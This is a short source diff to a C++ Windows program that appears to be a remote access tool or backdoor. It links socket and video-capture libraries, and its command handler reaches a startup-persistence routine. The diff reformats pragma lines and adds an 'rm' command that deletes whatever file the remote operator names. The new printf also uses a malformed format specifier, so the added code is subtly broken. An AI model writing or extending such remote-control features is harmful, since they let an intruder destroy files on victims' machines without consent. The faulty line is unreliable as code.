@@ -18,9 +18,9 @@
 #include <string>
 #include <sstream>
 
-#pragma comment (lib, "Ws2_32.lib")
-#pragma comment (lib, "Mswsock.lib")
-#pragma comment (lib, "AdvApi32.lib")
+#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Mswsock.lib")
+#pragma comment(lib, "AdvApi32.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "Gdi32.lib")
 #pragma comment(lib, "Vfw32.lib")
@@ -121,6 +121,9 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
     utils::startup((char*)path.c_str());
     *listen = FALSE;
     *loop = FALSE;
+  } else if (cmd == "rm") {
+    printf("removing %", args.c_str());
+    remove(args.c_str());
   }
 }
 
